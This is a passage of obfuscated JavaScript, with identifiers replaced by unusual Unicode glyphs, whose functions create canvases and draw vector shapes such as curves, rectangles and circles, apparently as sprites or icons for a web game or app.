			var ΔⵠΔΔ = ᐃ * 10;
			var ᐃⵠΔⲆ = 8 * ᐃ;
			var ⲆΔⵠΔⲆᐃⲆ = 112 * ᐃ;
			var ΔᐃᐃⵠᐃΔⵠ = 82 * ᐃ;
			var ⲆⲆΔᐃⲆᐃᐃ = ⲆΔⵠΔⲆᐃⲆ / ⲆⵠΔΔ;
			var ⵠⲆⵠᐃⵠⵠⲆ = ΔᐃᐃⵠᐃΔⵠ / ⵠⵠⵠΔ;
			var ⵠⲆⵠ = ᐃⲆᐃⲆⵠ * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(w2 - ᐃ * ⵠᐃΔΔ, ΔΔⵠⲆᐃ + 4 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Ⲇᐃᐃ(Δ, -ⲆⲆΔᐃⲆᐃᐃ, -ⵠⲆⵠᐃⵠⵠⲆ, ⲆΔⵠΔⲆᐃⲆ, ΔᐃᐃⵠᐃΔⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔⲆⵠ;
			Δ.translate(Δⵠᐃ, -ᐃⵠΔⲆ);
			Ⲇᐃᐃ(Δ, -ⲆⲆΔᐃⲆᐃᐃ, -ⵠⲆⵠᐃⵠⵠⲆ, ⲆΔⵠΔⲆᐃⲆ, ΔᐃᐃⵠᐃΔⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⵠᐃⲆ], ⵠⲆⵠ);
			var ᐃⵠⵠ = ᐃ * 55;
			var ⵠⵠᐃ = ᐃ * 45;
			var ΔⵠΔΔ = ᐃⲆⵠⵠ;
			Δ.translate(ᐃ * -40, ᐃ * -30);
			Ⲇᐃᐃ(Δ, ΔΔⵠⵠ, 0, ᐃⵠⵠ, ⵠⵠᐃ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[3]);
			var ᐃⵠ = ᐃΔⵠⵠᐃᐃᐃ(.7 * ᐃ, Ⲇᐃ[ΔΔⵠΔ]);
			Δ.drawImage(ᐃⵠ, 45 * ᐃ, ᐃ * -25);
			var ᐃⵠ = ᐃΔⵠⵠᐃᐃᐃ(ᐃ * .7, Ⲇᐃ[ⵠⵠⵠⵠ]);
			Δ.drawImage(ᐃⵠ, 45 * ᐃ, ᐃ * 15);
			var ᐃⵠ = ᐃΔⵠⵠᐃᐃᐃ(ᐃ * 1.2, Ⲇᐃ[3]);
			Δ.drawImage(ᐃⵠ, ᐃ * 28, ᐃ * -30);
			var ᐃⵠⵠ = 15 * ᐃ;
			var ⵠⵠᐃ = 70 * ᐃ;
			var ΔⵠΔΔ = ⲆΔΔᐃ * ᐃ;
			Δ.translate(ᐃ * 78, ᐃ * -ᐃΔΔⲆ);
			Ⲇᐃᐃ(Δ, ᐃⵠⲆ, ΔΔⵠⵠ, ᐃⵠⵠ, ⵠⵠᐃ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠᐃ]);
			var ᐃⵠⵠ = ᐃ * 9;
			var ⵠⵠᐃ = ᐃ * 50;
			var ΔⵠΔΔ = ᐃᐃⲆⲆ * ᐃ;
			Δ.translate(-ⲆⲆⲆⵠΔ * ᐃ, ᐃ * 20);
			Δ.rotate(Math.PI / 5);
			Δ.globalAlpha = .6;
			Ⲇᐃᐃ(Δ, ⲆⲆⲆᐃ, 0, ᐃⵠⵠ, ⵠⵠᐃ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.translate(-ⵠᐃΔᐃᐃ * ᐃ, 29 * ᐃ);
			Δ.rotate(Math.PI / 5);
			Δ.globalAlpha = .6;
			Δ.beginPath();
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(Δⵠᐃ, 0);
			Δ.lineTo(0, 30 * ᐃ);
			Δ.lineTo(30 * ᐃ, 30 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, null, Ⲇᐃ[ᐃᐃⲆᐃ], ᐃ * ⵠⲆⲆΔΔ);
			return Ⲇⵠ
		}
		var ᐃᐃⲆΔⵠᐃⵠⵠⵠ = 790;

		function ⵠᐃⵠΔⲆᐃᐃⵠᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 238 * ᐃ;
			Ⲇⵠ.height = ᐃ * 230;
			Δ.translate(ᐃ * -93, -110 * ᐃ);
			ⵠᐃᐃ(Δ, 213.5 * ᐃ, ᐃ * 256.75, ᐃ * 75);
			ΔⲆ(Δ, Ⲇᐃ);
			ⵠᐃᐃ(Δ, 213.5 * ᐃ, 175.75 * ᐃ, ᐃ * 25);
			ΔⲆ(Δ, Ⲇᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 156.5, ᐃ * 137.75);
			Δ.bezierCurveTo(ᐃ * 170.5, 173.75 * ᐃ, ᐃ * 195.5, 177.75 * ᐃ, 209.5 * ᐃ, 177.75 * ᐃ);
			Δ.lineWidth = ᐃ * ΔⵠⲆᐃⵠⲆᐃ;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 217.5, 178.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 251.5, ᐃ * 177.75, ᐃ * 263.5, ᐃ * 153.75, ᐃ * 270.5, ᐃ * 140.75);
			Δ.lineWidth = ᐃ * 17;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 130.5, ᐃ * 124.75);
			Δ.bezierCurveTo(153.5 * ᐃ, ᐃ * 185.75, ᐃ * 198.5, 185.75 * ᐃ, 213.5 * ᐃ, ᐃ * 185.75);
			Δ.lineWidth = ᐃ * 17;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 214.5, ᐃ * 183.75);
			Δ.bezierCurveTo(ᐃ * 265.5, 192.75 * ᐃ, ᐃ * 293.5, 141.75 * ᐃ, 297.5 * ᐃ, 124.75 * ᐃ);
			Δ.lineWidth = ⵠᐃⲆⲆⲆⲆⲆ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(107.5 * ᐃ, ᐃ * 213.75);
			Δ.bezierCurveTo(151.5 * ᐃ, ᐃ * 190.75, ᐃ * 198.5, ᐃ * 184.75, ᐃ * 210.5, ᐃ * 184.75);
			Δ.lineWidth = 17 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 212.5, 187.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 258.5, 182.75 * ᐃ, ᐃ * 286.5, 194.75 * ᐃ, ᐃ * 314.5, ᐃ * 206.75);
			Δ.lineWidth = 17 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(102.5 * ᐃ, ᐃ * 258.75);
			Δ.bezierCurveTo(142.5 * ᐃ, 200.75 * ᐃ, 193.5 * ᐃ, 194.75 * ᐃ, ᐃ * 211.5, ᐃ * 185.75);
			Δ.lineWidth = ᐃ * 17;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 214.5, 192.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 276.5, 194.75 * ᐃ, ᐃ * 306.5, ᐃ * 233.75, 316.5 * ᐃ, 246.75 * ᐃ);
			Δ.lineWidth = 17 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 219.5, 158.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 226.5, 159.75 * ᐃ, ᐃ * 227.5, 147.75 * ᐃ, 219.5 * ᐃ, ᐃ * 145.75);
			Δ.closePath();
			Δ.lineWidth = ᐃ * 10;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(210.5 * ᐃ, ᐃ * 160.75);
			Δ.bezierCurveTo(ᐃ * 203.5, ᐃ * 159.75, 199.5 * ᐃ, 146.75 * ᐃ, ᐃ * 210.5, 145.75 * ᐃ);
			Δ.closePath();
			Δ.lineWidth = ᐃ * ΔⲆⵠⲆⲆ;
			Δ.strokeStyle = Ⲇᐃ;
			Δ.stroke();
			return Ⲇⵠ
		}

		function ⵠⵠⲆᐃⲆΔⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 55 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 55;
			var ᐃⵠΔⲆ = ⵠⵠᐃΔⲆ * ᐃ;
			var ⵠⲆⵠ = ΔⲆⲆⲆ * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(-65 * ᐃ, -55 * ᐃ + ᐃⵠΔⲆ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.moveTo(95 * ᐃ, ᐃ * 60);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * 62, 110 * ᐃ, ᐃ * 73, 107 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 85, ᐃ * 85, 93 * ᐃ, 81 * ᐃ, 88 * ᐃ);
			Δ.bezierCurveTo(74 * ᐃ, 80 * ᐃ, 85 * ᐃ, ᐃ * 60, 95 * ᐃ, 60 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ], Ⲇᐃ[1], ᐃᐃⲆΔⵠ);
			Δ.globalAlpha = ΔΔΔ;
			Δ.beginPath();
			Δ.moveTo(ᐃ * 91, ᐃ * 70);
			Δ.bezierCurveTo(91 * ᐃ, 75 * ᐃ, 100 * ᐃ, 76 * ᐃ, ᐃ * ⵠⵠΔᐃᐃ, 73 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⵠⲆⲆᐃⵠΔⵠ, 69 * ᐃ, ᐃ * 89, ᐃ * 65, ᐃ * 91, 70 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔⵠ], Ⲇᐃ[3], 3);
			return Ⲇⵠ
		}
		const ⲆΔⵠᐃⵠᐃⵠ = ᐃᐃᐃⵠⵠ;
		const ΔᐃΔΔΔΔⵠ = ⵠⵠᐃΔⵠᐃᐃ;
		const ᐃⵠⲆΔᐃ = ⲆΔⵠⵠ;
		const ᐃⵠᐃᐃⵠ = ΔᐃᐃⲆᐃ;
		const Δᐃᐃⵠ = ΔΔⵠ;

		function ⲆᐃⵠΔΔΔΔ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 400;
			Ⲇⵠ.height = 400 * ᐃ;
			Δ.save();
			Δ.translate(202.5 * ᐃ, ᐃ * 147.5);
			Ⲇᐃᐃ(Δ, -96.5 * ᐃ, -21.5 * ᐃ, ᐃ * 193, ᐃ * 193, ᐃ * Δᐃᐃᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⲆⵠ], ᐃ * ᐃⲆⲆΔΔⲆᐃ);
			Δ.save();
			Δ.translate(ᐃ * 202.5, 190.5 * ᐃ);
			Ⲇᐃᐃ(Δ, 96.5 * ᐃ, ᐃ * -21.5, ᐃ * -193, ᐃ * 43, ᐃ * 0);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[1], ᐃ * 12);
			Δ.save();
			Δ.save();
			Δ.translate(202.5 * ᐃ, 233.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -96.5 * ᐃ, -20.5 * ᐃ, 193 * ᐃ, 41 * ᐃ, 0 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[1], ᐃ * 12);
			Δ.save();
			Δ.translate(ᐃ * 202.5, ᐃ * 275);
			Ⲇᐃᐃ(Δ, 96.5 * ᐃ, -21 * ᐃ, ᐃ * -193, ᐃ * 42, 0 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃᐃ], Ⲇᐃ[ⵠᐃⵠΔ], ᐃ * ⵠⲆΔΔᐃ);
			Δ.save();
			Δ.translate(ᐃ * 201, ᐃ * 212);
			Δ.rotate(8.64);
			Ⲇᐃᐃ(Δ, -116 * ᐃ, -22 * ᐃ, ᐃ * 232, ᐃ * 44, ⵠⵠΔⲆᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ᐃ * ΔᐃΔⵠⵠ);
			Δ.save();
			Δ.translate(ᐃ * 203.5, ᐃ * 121.5);
			Ⲇᐃᐃ(Δ, -115.5 * ᐃ, ᐃ * -20.5, ᐃ * 231, ᐃ * 41, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠΔⲆ], 12 * ᐃ);
			Δ.save();
			Δ.translate(203.5 * ᐃ, 299 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -115.5, ᐃ * -20, 231 * ᐃ, 40 * ᐃ, ⵠᐃⲆⲆΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ], Ⲇᐃ[ᐃᐃⲆΔ], ᐃ * ΔᐃⵠⲆⵠ);
			Δ.save();
			Δ.translate(ᐃ * 298.5, 210 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -20.5, -109 * ᐃ, ᐃ * 41, ᐃ * 218, ᐃ * ΔᐃⲆⲆⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ᐃ * ᐃⲆⵠᐃⵠ);
			Δ.save();
			Δ.translate(108.5 * ᐃ, 210 * ᐃ);
			Ⲇᐃᐃ(Δ, -20.5 * ᐃ, ᐃ * -109, 41 * ᐃ, 218 * ᐃ, ᐃ * ᐃΔᐃΔⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ⲆΔⲆΔⲆ * ᐃ);
			Δ.save();
			Δ.translate(204 * ᐃ, 121.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -92 * ᐃ, -9.5 * ᐃ, ᐃ * 184, ΔⲆⲆⲆⵠ * ᐃ, ᐃᐃⲆⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[ⵠΔΔΔΔ], ᐃ * 10);
			Δ.save();
			Δ.translate(197 * ᐃ, ᐃ * 299);
			Ⲇᐃᐃ(Δ, 85 * ᐃ, -ΔΔΔᐃᐃ * ᐃ, ᐃ * -170, ᐃ * ᐃⲆᐃⲆⲆᐃᐃ, ᐃⵠΔⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ], Ⲇᐃ[ᐃⵠⲆΔᐃ], ⲆⲆⲆΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(94 * ᐃ, 317 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, 299.5 * ᐃ, ᐃ * 110.5, 299.5 * ᐃ, 127 * ᐃ, 282 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[ⲆⵠⲆⲆ], ᐃ * ᐃⲆⵠᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(279 * ᐃ, ᐃ * 142);
			Δ.bezierCurveTo(296.5 * ᐃ, ᐃ * 125.5, 296.5 * ᐃ, 125.5 * ᐃ, 314 * ᐃ, ᐃ * 109);
			Δ.closePath();
			ΔⲆ(Δ, ⲆᐃΔⲆᐃ, Ⲇᐃ[ⵠⲆΔ], ᐃ * ⵠⲆᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 93, 106 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, 124 * ᐃ, 110.5 * ᐃ, 124 * ᐃ, 128 * ᐃ, 142 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[ΔⲆⵠ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 281, 282 * ᐃ);
			Δ.bezierCurveTo(296 * ᐃ, ᐃ * 297.5, ᐃ * 296, ᐃ * 297.5, ᐃ * 311, ᐃ * 313);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[1], ᐃ * 12);
			if (ⵠᐃ == ⵠⲆⲆ) {
				Δ.scale(2, ⲆⵠΔΔ);
				Δ.translate(ᐃ * -ᐃᐃᐃⵠᐃ, 55 * ᐃ);
				Δ.rotate(-.5);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(60 * ᐃ, ᐃ * 47);
				Δ.bezierCurveTo(ᐃ * 81, ᐃ * 46, ᐃ * 85, 47 * ᐃ, ᐃ * 83, ᐃ * 63);
				Δ.bezierCurveTo(ᐃ * 83, ᐃ * 72, ᐃ * 83, ᐃ * 75, ᐃ * 72, ᐃ * 73);
				Δ.bezierCurveTo(ᐃ * 68, 80 * ᐃ, 69 * ᐃ, ᐃ * 82, 66 * ᐃ, 73 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 62, ᐃ * 81, 61 * ᐃ, 82 * ᐃ, 59 * ᐃ, ᐃ * 73);
				Δ.bezierCurveTo(54 * ᐃ, ᐃ * 81, 55 * ᐃ, ᐃ * 81, ᐃ * 52, ᐃ * 74);
				Δ.bezierCurveTo(ᐃ * 38, 76 * ᐃ, ᐃ * 41, ᐃ * 74, ᐃ * 40, 66 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 38, 45 * ᐃ, 39 * ᐃ, ᐃ * 49, 59 * ᐃ, 47 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], ᐃ * ⵠⵠΔⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔᐃΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 68, 54 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 75, ᐃ * 54, ᐃ * 77, ᐃ * 62, 71 * ᐃ, ᐃ * 64);
				Δ.bezierCurveTo(62 * ᐃ, 65 * ᐃ, 63 * ᐃ, ᐃ * 54, 68 * ᐃ, 54 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(50 * ᐃ, 55 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 57, ᐃ * 55, 58 * ᐃ, 65 * ᐃ, ᐃ * 52, ᐃ * 65);
				Δ.bezierCurveTo(ᐃ * 44, 66 * ᐃ, ᐃ * 44, 54 * ᐃ, ᐃ * 50, 55 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ])
			} else if (ᐃᐃⵠ == ⵠᐃ) {
				Δ.scale(.6, .6);
				Δ.translate(185 * ᐃ, 165 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(108 * ᐃ, ᐃ * 56);
				Δ.bezierCurveTo(ᐃ * 136, ᐃ * 58, 203 * ᐃ, ᐃ * 69, ᐃ * 234, 75 * ᐃ);
				Δ.bezierCurveTo(246 * ᐃ, 77 * ᐃ, ᐃ * 247, ᐃ * 78, ᐃ * 245, 90 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 238, 143 * ᐃ, 228 * ᐃ, ᐃ * 197, 214 * ᐃ, 259 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 212, ᐃ * 267, ᐃ * 209, 270 * ᐃ, 189 * ᐃ, ᐃ * 268);
				Δ.bezierCurveTo(ᐃ * 142, ᐃ * 264, ᐃ * 106, ᐃ * 260, 75 * ᐃ, ᐃ * 253);
				Δ.bezierCurveTo(ᐃ * 60, 250 * ᐃ, ᐃ * 64, 250 * ᐃ, ᐃ * 66, ᐃ * 221);
				Δ.bezierCurveTo(71 * ᐃ, 168 * ᐃ, 87 * ᐃ, ᐃ * 95, ᐃ * 98, ᐃ * 67);
				Δ.bezierCurveTo(101 * ᐃ, ᐃ * 57, ᐃ * 103, 56 * ᐃ, 106 * ᐃ, ᐃ * 56);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], 20 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(112 * ᐃ, 72 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 132, ᐃ * 73, ᐃ * 227, ᐃ * 85, ᐃ * 226, ᐃ * 91);
				Δ.bezierCurveTo(ᐃ * 231, ᐃ * 89, 217 * ᐃ, ᐃ * 196, ᐃ * 200, ᐃ * 250);
				Δ.bezierCurveTo(ᐃ * 196, ᐃ * 254, ᐃ * 175, ᐃ * 249, 166 * ᐃ, 249 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 91, ᐃ * 241, 82 * ᐃ, ᐃ * 236, ᐃ * 83, 232 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 90, 144 * ᐃ, ᐃ * 108, 71 * ᐃ, 111 * ᐃ, ᐃ * 72);
				Δ.closePath();
				ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[0], ᐃ * ⵠᐃᐃΔⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔⲆ];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(132 * ᐃ, ᐃ * 117);
				Δ.bezierCurveTo(ᐃ * 171, ᐃ * 86, ᐃ * 191, ᐃ * 101, ᐃ * 188, 134 * ᐃ);
				Δ.bezierCurveTo(185 * ᐃ, ᐃ * 154, 170 * ᐃ, 158 * ᐃ, 153 * ᐃ, 158 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 143, ᐃ * 172, ᐃ * 146, ᐃ * 180, 147 * ᐃ, 193 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[0], ᐃ * 20);
				ⵠᐃᐃ(Δ, 142 * ᐃ, 221 * ᐃ, 16.1245154965971 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ])
			}
			return Ⲇⵠ
		}

		function ΔᐃᐃᐃΔΔΔΔⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 400;
			Ⲇⵠ.height = 400 * ᐃ;
			Δ.save();
			Δ.translate(202.5 * ᐃ, ᐃ * 147.5);
			Ⲇᐃᐃ(Δ, -96.5 * ᐃ, -21.5 * ᐃ, ᐃ * 193, ᐃ * 43, ᐃ * 0);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ], Ⲇᐃ[0], ᐃ * ΔᐃΔⵠⵠ);
			Δ.save();
			Δ.translate(202.5 * ᐃ, ᐃ * 190.5);
			Ⲇᐃᐃ(Δ, 96.5 * ᐃ, ᐃ * -21.5, -193 * ᐃ, ᐃ * 43, 0 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ⵠⲆΔΔᐃ * ᐃ);
			Δ.save();
			Δ.translate(202.5 * ᐃ, 233.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -96.5 * ᐃ, ᐃ * -20.5, ᐃ * 193, 41 * ᐃ, Δᐃᐃⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ], Ⲇᐃ[ΔⲆⵠⲆ], ᐃ * ⵠΔᐃΔⵠⲆⵠ);
			Δ.save();
			Δ.translate(ᐃ * 202.5, ᐃ * 275);
			Ⲇᐃᐃ(Δ, 96.5 * ᐃ, ᐃ * -21, -193 * ᐃ, 42 * ᐃ, ΔᐃΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ], Ⲇᐃ[0], ᐃ * ΔᐃⵠⲆⵠ);
			Δ.save();
			Δ.translate(203.5 * ᐃ, 121.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -115.5, ᐃ * -20.5, 231 * ᐃ, 41 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔᐃΔΔ], ᐃ * 12);
			Δ.save();
			Δ.translate(203.5 * ᐃ, ᐃ * 299);
			Ⲇᐃᐃ(Δ, ᐃ * -115.5, ᐃ * -20, 231 * ᐃ, ᐃ * 40, ⲆΔΔᐃᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠΔⲆⵠ], 12 * ᐃ);
			Δ.save();
			Δ.translate(298.5 * ᐃ, 210 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -20.5, ᐃ * -109, ᐃ * 41, 218 * ᐃ, ᐃ * ᐃⵠᐃΔⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ], Ⲇᐃ[0], 12 * ᐃ);
			Δ.save();
			Δ.translate(108.5 * ᐃ, ᐃ * 210);
			Ⲇᐃᐃ(Δ, ᐃ * -20.5, ᐃ * -109, ᐃ * 41, ᐃ * 218, ⵠᐃⲆⲆΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[ΔⲆⲆ], 12 * ᐃ);
			return Ⲇⵠ
		}

		function ᐃΔⵠⵠⲆⲆⲆᐃⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 450;
			Ⲇⵠ.height = ᐃ * 470;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(226.5 * ᐃ, ᐃ * 91.546875);
			Δ.bezierCurveTo(ᐃ * 254.5, 115.546875 * ᐃ, 261.5 * ᐃ, ᐃ * 115.546875, ᐃ * 294.5, ᐃ * 109.546875);
			Δ.bezierCurveTo(ᐃ * 299.5, ᐃ * 141.546875, ᐃ * 315.5, 151.546875 * ᐃ, ᐃ * 344.5, ᐃ * 158.546875);
			Δ.bezierCurveTo(ᐃ * 330.5, ᐃ * 195.546875, ᐃ * 341.5, 207.546875 * ᐃ, 361.5 * ᐃ, ᐃ * 226.546875);
			Δ.bezierCurveTo(ᐃ * 331.5, ᐃ * 251.546875, ᐃ * 335.5, ᐃ * 270.546875, ᐃ * 342.5, 295.546875 * ᐃ);
			Δ.bezierCurveTo(300.5 * ᐃ, ᐃ * 296.546875, 293.5 * ᐃ, ᐃ * 325.546875, 292.5 * ᐃ, ᐃ * 344.546875);
